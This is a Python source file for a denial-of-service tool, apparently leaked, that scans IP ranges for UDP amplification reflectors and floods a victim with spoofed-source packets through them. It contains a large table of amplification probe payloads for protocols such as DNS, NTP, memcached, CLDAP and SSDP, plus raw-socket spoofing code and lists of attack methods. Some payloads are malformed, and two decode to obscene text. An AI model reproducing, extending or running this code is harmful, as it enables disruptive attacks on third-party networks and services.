# -*- coding: utf-8 -*-
from argparse import ArgumentParser, FileType, Namespace
from enum import Enum
from random import randint
from re import compile, MULTILINE
from socket import (IPPROTO_IP, SOCK_RAW, IPPROTO_UDP, inet_ntoa, AF_INET, IP_HDRINCL, SOCK_DGRAM, socket)
from struct import pack as data_pack
from threading import Thread, Lock, Event as _synEvent, Event
from time import sleep
from typing import (Set, Tuple, Dict, List, Iterator, TextIO, Any, Callable)

from impacket.ImpactPacket import IP, UDP, Data
from iptools import IpRangeList

__version__ = "1.0 SNAPSHOT"
__all__ = {"AMPFlooder", "AMPScanner", "AMPPayloads", "SyncIPRange"}


class Regex:
    IP = compile("(?:\d{1,3}\.){3}\d{1,3}")
    IPPOWER = compile("((?:\d{1,3}\.){3}\d{1,3})[ ]+(?:[.][ ]+|)(\d+)")
    RANGEIP = compile("((?:\d{1,3}\.){3}\d{1,3})-((?:\d{1,3}\.){3}\d{1,3})")
    ProxyURL = compile("^(?:\s+|)(?:\[|\||)(?:\s+|)(\w+)(?:\s+|)(?:]|\||://|)(?:\s+|)(?:([\d.]+)|)(?:\s+|)"
                       "(?::(\d{1,5})|)(?::|)(?:(\w+):(\w+)|)(?:@([\d.]+)(?::(\d{1,5})|)|)$", MULTILINE)


class ProxyParser:
    _host: str
    _port: int
    _type: str
    _proxy: List[Any]
    
    def __init__(self, data: str) -> None:
        self._proxy = Regex.ProxyURL.findall(data.strip())[0]
        self._type = self._proxy[0]
        self._port = int(self._proxy[2] if self._proxy[2] != "" else self._proxy[6])
        self._host = (self._proxy[1] if self._proxy[1] != "" else self._proxy[5])
    
    def __str__(self):
        return "Type: %s Host: %s Port: %d" % (self._type, self._host, self._port)


class SyncIPRange(IpRangeList, Iterator[str]):
    _iter: Iterator[str]
    _read_lock: Lock
    
    def __init__(self, *args):
        super().__init__(*args)
        self._read_lock = Lock()
        self._iter = self.__iter__()
    
    def __next__(self) -> str:
        with self._read_lock:
            return next(self._iter)


class Tools:
    @staticmethod
    def randIPv4() -> str:
        return inet_ntoa(data_pack('>I', randint(1, 0xffffffff)))
    
    @staticmethod
    def randString(size: int) -> str:
        return '%0x' % randint(0, 16 ** size)
    
    @staticmethod
    def PowerFixer(min_power: int, IO: TextIO) -> None:
        data = "\n".join([f"{node[0]} {node[1]}" for node in Regex.IPPOWER.findall(IO.read()) if
                          node[1].isdigit() and int(node[1]) > min_power])
        IO.seek(0)
        IO.truncate(0)
        IO.write(data)
    
    @staticmethod
    def FindRange(scan) -> Any:
        src = Regex.RANGEIP.search(scan)
        if src is not None:
            return SyncIPRange((src.group(1), src.group(2)))
        return None


class AMPPayloads(Enum):
    MSSQL: Tuple[bytes, int] = (b'\x02', 1434)
    QUIC: Tuple[bytes, int] = (b'\x0e\x00\x00\x00\x00\x00\x00\x00\x00', 80)
    AFS: Tuple[bytes, int] = (b'\x00\x00\x03\xe7\x00\x00\x00\x00\x00\x00\x00\x65\x00\x00\x00\x00\x00\x00\x00\x00\x0d'
                              b'\x05\x00\x00\x00\x00\x00\x00\x00', 7001)
    BITTORRENT: Tuple[bytes, int] = (b'd1:ad2:id20:abcdefghij01234567896:target20:mnopqrstuvwxyz123456e1:q9:find_node1'
                                     b':t1:a1:y1:qe', 6881)
    COAP: Tuple[bytes, int] = (b'\x40\x01\x01\x01\xbb\x2e\x77\x65\x6c\x6c\x2d\x6b\x6e\x6f\x77\x6e\x04'
                               b'\x63\x6f\x72\x65', 5683)
    COAP2: Tuple[bytes, int] = (b'\x44\x01\x0f\x3c\xd1\x97\x96\xc1\xc1\x3c\xff\x00\x00', 5683)
    NATPMP: Tuple[bytes, int] = (b'\x00\x00', 5351)
    NETIS: Tuple[bytes, int] = (b'\x0a', 53413)
    SENTINEL: Tuple[bytes, int] = (b'\x7a\x00\x00\x00\x00\x00', 5093)
    SIP: Tuple[bytes, int] = (b'\xaa', 5060)
    MODBUS: Tuple[bytes, int] = (b'GET-REPORT-SVR-INFO', 502)
    IPSEC: Tuple[bytes, int] = (b'\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01', 500)
    DTLS: Tuple[bytes, int] = (b'\x0a\x00\x00\x00\x00\x00\x00\x00\x00', 443)
    CCIP: Tuple[bytes, int] = (b'\x14', 41794)
    CLDAP: Tuple[bytes, int] = (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
                                b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00', 389)
    BFD: Tuple[bytes, int] = (b'\x56\xc8\xf4\xf9\x60\xa2\x1e\xa5\x4d\xfb\x03\xcc\x51\x4e\xa1\x10\x95\xaf\xb2\x67\x17'
                              b'\x67\x81\x32\xfb\x57\xfd\x8e\xd2\x22\x72\x03\x34\x7a\xbb\x98', 3784)
    DVR: Tuple[bytes, int] = (b'\xff', 37810)
    WSD: Tuple[bytes, int] = (b'<:>', 3702)
    STUN: Tuple[bytes, int] = (b'\x00\x01\x00\x00\x21\x12\xa4\x42\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                               b'\x00', 3478)
    RDP: Tuple[bytes, int] = (b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00', 3389)
    JENKINS: Tuple[bytes, int] = (b'\n', 33848)
    ARD: Tuple[bytes, int] = (b'\x00\x14\x00\x00', 3283)
    PLEX: Tuple[bytes, int] = (b'\x4d', 32414)
    LLOT: Tuple[bytes, int] = (b'\x00\x00\x00\xf8', 30718)
    FIVEM: Tuple[bytes, int] = (b'\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73', 30120)
    QUAKE3: Tuple[bytes, int] = (b'\xff\xff\xff\xffgetstatus', 27960)
    STEAM: Tuple[bytes, int] = (b'\xff\xff\xff\xff\x21\x4c\x5f\xa0\x05\x00\x00\x00\x08\xd2\x09\x10\x00', 27036)
    SRCDS: Tuple[bytes, int] = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75'
                                b'\x65\x72\x79\x00', 27015)
    DIGIMAN: Tuple[bytes, int] = (b'\x44\x49\x47\x49\x00\x01\x00\x06\xff\xff\xff\xff\xff\xff', 27036)
    POWERHOUSE: Tuple[bytes, int] = (b'\x00', 20811)
    SSDP: Tuple[bytes, int] = (b'M-SEARCH\r\nST:ssdp:all\r\nMAN:"ssdp:discover"\r\n', 1900)
    XDMCP: Tuple[bytes, int] = (b'\x00\x01\x00\x02\x00\x01\x00', 177)
    VXWORKS: Tuple[bytes, int] = (b'\x1a\x09\xfa\xba\x00\x00\x00\x00\x00\x00\x00\x02\x55\x55\x55\x55\x00\x00\x00\x01'
                                  b'\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                                  b'\xff\xff\x55\x12\x00\x00\x00\x3c\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x00'
                                  b'\x00\x00\x00\x00', 17185)
    QOTD: Tuple[bytes, int] = (b'\x0d', 17)
    SNMP: Tuple[bytes, int] = (b'\x30\x24\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x17\x02\x04\x7b\x73\xcc\x13'
                               b'\x02\x01\x00\x02\x01\x64\x30\x09\x30\x07\x06\x03\x2b\x06\x01\x05\x00', 161)
    CITRIX: Tuple[bytes, int] = (b'\x2a\x00\x01\x32\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x21\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                                 b'\x00\x00', 1604)
    NETBIOS: Tuple[bytes, int] = (b'\xe5\xd8\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x20\x43\x4b\x41\x41\x41\x41\x41'
                                  b'\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41'
                                  b'\x41\x41\x41\x41\x41\x00\x00\x21\x00\x01', 137)
    OPENVPN: Tuple[bytes, int] = (b'\x38', 1194)
    MEMCACHED: Tuple[bytes, int] = (b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
    PORTMAP: Tuple[bytes, int] = (b'\x65\x72\x0a\x37\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x00\x00'
                                  b'\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                                  b'\x00\x00', 111)
    UBIQUITI: Tuple[bytes, int] = (b'\x01\x00\x00\x00', 10001)
    DNS: Tuple[bytes, int] = (b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                              b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00', 53)
    NTP: Tuple[bytes, int] = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
    CHARGEN: Tuple[bytes, int] = (b'\x01', 19)
    TEAMSPEAK: Tuple[bytes, int] = (b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02', 9987)
    TFTP: Tuple[bytes, int] = (b'\x00\x01\x2f\x78\x00\x6e\x65\x74\x61\x73\x63\x69\x69\x00', 69)
    MDNS: Tuple[bytes, int] = (b'\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09\x5F\x73\x65\x72\x76\x69\x63\x65'
                               b'\x73\x07\x5F\x64\x6E\x73\x2D\x73\x64\x04\x5F\x75\x64\x70\x05\x6C\x6F\x63\x61\x6C\x00'
                               b'\x00\x0C\x00\x01', 5353)
    DB2: Tuple[bytes, int] = (b'\6vx44\x42\x32\x47\x45\x54\x41\x44\x44\x52\x00\x53\x51\x4c\x30\x35\x30\x30\x30'
                              b'\x00', 523)
    XDCMP: Tuple[bytes, int] = (b'\x00\x01\x00\x02\x00\x01\x00', 177)
    ECHO: Tuple[bytes, int] = (b'\x0D\x0A\x0D\x0A', 7)
    HEARTBEAT: Tuple[bytes, int] = (b'\x5c\x73\x74\x61\x74\x75\x73\x5c', 7778)
    SAMP: Tuple[bytes, int] = (b'\xff', 7777)
    RIP: Tuple[bytes, int] = (b'\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                              b'\x00\x00\x10', 520)
    CRESTRON: Tuple[bytes, int] = (b'\x14', 41794)
    IKEV2: Tuple[bytes, int] = (b'qwy1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\xf5\xc6\x00'
                                b'\x00', 500)
    BIDIRECTIONAL: Tuple[bytes, int] = (b'\x56\xc8\xf4\xf9\x60\xa2\x1e\xa5\x4d\xfb\x03\xcc\x51\x4e\xa1\x10\x95\xaf\xb2'
                                        b'\x67\x17\x67\x81\x32\xfb\x57\xfd\x8e\xd2\x22\x72\x03\x34\x7a\xbb\x98', 3784)
    WIREGUARD: Tuple[bytes, int] = (b'\\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
                                    b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
                                    b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                                    b'\x73', 51802)
    TURN: Tuple[bytes, int] = (b'\0x\x00\x00', 8088)
    SUMSUNG: Tuple[bytes, int] = (b'\x00', 8600)
    DVRV2: Tuple[bytes, int] = (b'\0x', 37810)
    DNSV2: Tuple[bytes, int] = (b'\x00\0x\x00', 37810)
    MINECRAFT: Tuple[bytes, int] = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
                                    b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
                                    b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                                    b'\x73', 8078)
    CSGO: Tuple[bytes, int] = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                               b'\x20\x51\x75\x65\x72\x79\x00', 45983)
    UPNP: Tuple[bytes, int] = (b'\x00', 1900)
    FILIPEK: Tuple[bytes, int] = (b'\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x02\xfd\x66\xd3\x00\x00\x00'
                                  b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00', 34)
    STUNV3: Tuple[bytes, int] = (b'\x00\x01\x00\x00\x21\x12\xa4\x42\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                                 b'\x00\r\n', 22)
    IPMI: Tuple[bytes, int] = (b'\x06\x00\xff\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x20\x18\xc8\x81\x00\x38\x8e'
                               b'\x04\xb5', 623)
    RUST: Tuple[bytes, int] = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75'
                               b'\x65\x72\x79\x00', 25244)


class Methods(Enum):
    AMP_METHODS: Set[str] = {*AMPPayloads.__members__.keys()}
    LAYER4_SPOOF: Set[str] = {"XSYN", "GREENSYN", "DOMINATE", "FRAG", "FIN", "ISSYN", "XMASS", "VSE", "XACK", "ESSYN",
                              "BOGUS", "YUBINA", "ZAP", "WINSEQID", "RUDP", "BYPASS", "OVH", "LEGIT", "MHOVH", "TS3",
                              "MC_BED", "DNS", "POD"}
    LAYER4_NONSPOOF: Set[str] = {"MINECRAFT_PING", "BYESSH", "LSQL", "STREAMER", "BIGDATA"}
    LAYER4_ALL: Set[str] = {*LAYER4_NONSPOOF, *LAYER4_SPOOF, *AMP_METHODS}
    
    LAYER7_METHODS: Set[str] = {"HTTP_LOSER", "BROWSER", "CF_UAM", "CF_CAPTCHA", "TOR_BYPASS", "AVB_BYPASS",
                                "SLOW_LORIS", "NULL", "DOWNLOADER", "GOGOL", "SLOWLORIS", "DYNO", "COOKIE", "XMLRPC",
                                "KEEPHATE"}
    
    ALL: Set[str] = {*AMP_METHODS, *LAYER4_ALL, *LAYER7_METHODS}


class AMPScanner(Thread):
    _synevent: _synEvent
    maxnodes: int
    nodes: Set[str]
    _io: TextIO
    _ip_range: SyncIPRange
    _sock: socket
    _payload: Tuple[bytes, int]
    
    def __init__(self, payload: AMPPayloads, ip_range: SyncIPRange, maxnodes: int = -1, IO: TextIO = None,
                 synevent: _synEvent = None) -> None:
        super().__init__(daemon=False)
        self._payload = payload.value
        self._sock = socket(AF_INET, SOCK_DGRAM)
        self._ip_range = ip_range
        self._io = IO
        self._synevent = synevent
        self.maxnodes = maxnodes
        self.nodes = set()
    
    def run(self):
        if self._synevent:
            self._synevent.wait()
        _AMPListner(self._sock, self._payload, self, self._io).start()
        while self.maxnodes == -1 or self.maxnodes > len(self.nodes):
            self._sock.sendto(self._payload[0], (next(self._ip_range), self._payload[1]))


class _AMPListner(Thread):
    _scanner: AMPScanner
    _IO: TextIO
    _payload: Tuple[bytes, int]
    _sock: socket
    
    def __init__(self, sock: socket, payload: Tuple[bytes, int], scanner: AMPScanner, IO: TextIO = None) -> None:
        super().__init__(daemon=False)
        self._sock = sock
        self._payload = payload
        self._scanner = scanner
        self._IO = IO
    
    def run(self) -> None:
        while self._scanner.maxnodes == -1 or self._scanner.maxnodes > len(self._scanner.nodes):
            data, addr = self._sock.recvfrom(65500)
            if len(data) > len(self._payload[0]) and addr[0] not in self._scanner.nodes:
                self._scanner.nodes.add(addr[0])
                print(f"{AMPPayloads(self._payload).name} {addr[0]} {len(data)}")
                if self._IO is not None:
                    self._IO.write(f"{addr[0]} {len(data)}\n")


class AMPFlooder(Thread):
    _max_pps: int
    _pps: int
    _event: _synEvent
    _sock: socket
    _bots: List[str]
    _payloads: Dict[str, bytes]
    _port: int
    _payload: Tuple[bytes, int]
    _target: Tuple[str, int]
    
    def __init__(self, target: Tuple[str, int], payload: Tuple[bytes, int], bots: List[str],
                 synevent: _synEvent = None, pps: int = -1) -> None:
        super().__init__(daemon=True)
        self._payload = payload
        self._bots = bots
        self._pps = 0
        self._max_pps = pps
        self._port = self._payload[1]
        self._target = target
        self._payloads = {}
        self._event = synevent
        self._sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)
        self._sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
    
    def run(self) -> None:
        self._genrate()
        if self._event:
            self._event.wait()
        while 1:
            if self._max_pps != -1 and self._pps > self._max_pps:
                self._pps -= 1
                continue
            for addr, pkt in self._payloads.items():
                self._sock.sendto(pkt, (addr, self._port))
                self._pps += 1
    
    def _genrate(self) -> None:
        for ref in self._bots:
            ip: IP = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)
            
            ud: UDP = UDP()
            ud.set_uh_dport(self._payload[1])
            ud.set_uh_sport(self._target[1])
            
            ud.contains(Data(self._payload[0]))
            ip.contains(ud)
            
            self._payloads[ref] = ip.get_packet()


class Argument(ArgumentParser):
    def __init__(self):
        super(Argument, self).__init__()
        self.add_argument('-v', '--verion', action='version', version='%(prog)s ' + __version__)
        self.add_argument('-u', '--methods', help="show list of methods and exit", dest="methods", action="store_true")
        self.add_argument('-b', '--target', dest="target", type=str)
        self.add_argument('-k', '--port', dest="port", type=int)
        self.add_argument('-m', '--method', dest="method", choices=Methods.ALL.value, metavar="")
        self.add_argument('-s', '--scan', dest="scan", default=None)
        self.add_argument('-l', '--filter', dest="filter", default=0, type=int)
        self.add_argument('-p', '--pps', dest="pps", default=-1, type=int)
        self.add_argument('-e', '--maxnods', dest="maxnods", default=-1, type=int)
        self.add_argument('-f', '--refelectors', dest="refelectors", type=FileType('r+'), default=None)
        self.add_argument('-r', '--thread', dest="thread", default=-1, type=int)
        self.add_argument('-t', '--type', dest="type", choices=["GET", "POST", "HEAD", "PUT", "OPTION"])
        self.add_argument('-d', '--data', dest="data", type=str)
        self.add_argument('-n', '--duration', dest="duration", type=int)
    
    def error(self, message: str) -> None:
        exit(message)
    
    def parse_args(self, **kwargs) -> Namespace:
        arg: Namespace = super(Argument, self).parse_args(**kwargs)
        if arg.methods:
            self.error(
                f'- Layer7\n | {", ".join(Methods.LAYER7_METHODS.value)} | {len(Methods.LAYER7_METHODS.value)} Methods\n - Layer4 Spoof\n | {", ".join(Methods.LAYER4_SPOOF.value)} | {len(Methods.LAYER4_SPOOF.value)} Methods\n - Layer4 Non Spoof\n | {", ".join(Methods.LAYER4_NONSPOOF.value)} | {len(Methods.LAYER4_NONSPOOF.value)} Methods\n - Amplification\n | {", ".join(Methods.AMP_METHODS.value)} | {len(Methods.AMP_METHODS.value)} Methods\n - All {len(Methods.ALL.value)} Methods')
        if arg.filter > 0:
            if not arg.refelectors:
                self.error("refelectors is empty")
            Tools.PowerFixer(arg.filter, arg.refelectors)
            self.error("Fixed !")
            return arg
        
        if not arg.method:
            self.error("argument -m/--method: expected one argument [Leaked by @ph03n1x69]")
        
        if arg.scan:
            event: Event = _synEvent()
            ips: SyncIPRange = Tools.FindRange(arg.scan)
            if not arg.refelectors:
                self.error("refelectors is empty")
            if not ips:
                self.error("range ip is not valid exmp: 1.1.1.1-255.255.255.255")
            for _ in range(abs(arg.thread)):
                AMPScanner(AMPPayloads[arg.method], ips, arg.maxnods, arg.refelectors, event).start()
            event.clear()
            event.set()
            return arg
        if not arg.target:
            self.error("argument -b/--target: expected one argument")
        if not arg.port and arg.method not in Methods.LAYER7_METHODS.value:
            self.error("argument -k/--port: expected one argument")
        if arg.method in Methods.AMP_METHODS.value:
            event: Event = _synEvent()
            if not arg.refelectors:
                self.error("refelectors is empty")
            nods: list[Any] = Regex.IP.findall(arg.refelectors.read())
            for _ in range(abs(arg.thread)):
                AMPFlooder((arg.target, arg.port), AMPPayloads[arg.method].value,
                           nods, event, arg.pps).start()
            event.clear()
            event.set()
        return arg


if __name__ == "__main__":
    arvg = Argument().parse_args()
    try:
        while 1:
            input()
    finally:
        arvg.refelectors.close()
        exit(-1)
